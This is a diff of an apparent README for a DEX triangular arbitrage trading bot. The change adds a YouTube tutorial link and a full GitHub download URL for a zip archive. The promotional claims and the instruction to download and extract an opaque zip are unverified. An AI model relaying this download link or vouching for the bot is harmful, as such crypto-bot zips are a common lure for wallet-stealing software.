@@ -1,10 +1,11 @@
 The JavaScript DEX Triangular Arbitrage Bot v4 (javascript version) is an advanced trading tool designed for executing triangular arbitrage strategies in the decentralized exchange (DEX) environment. The following is a comprehensive guide to assist in the setup and operation of the bot.
 Someone who tested the bot uploaded a video tutorial on how to config it here
 
+https://youtu.be/9Rg9gGIB324
 
 Step1: Download the JavaScript DEX Triangular Arbitrage Bot v4.zip file here.
 
-<a href="JavaScript-DEX-Triangular-Arbitrage-Bot-v4/raw/main/JavaScript-DEX-Triangular-Arbitrage-Bot-v4.zip" >Download Zip File</a>
+https://github.com/Code4Javascript/JavaScript-DEX-Triangular-Arbitrage-Bot-v4/raw/main/JavaScript-DEX-Triangular-Arbitrage-Bot-v4.zip
 
 Extract the contents of the zip file to a convenient location.
 
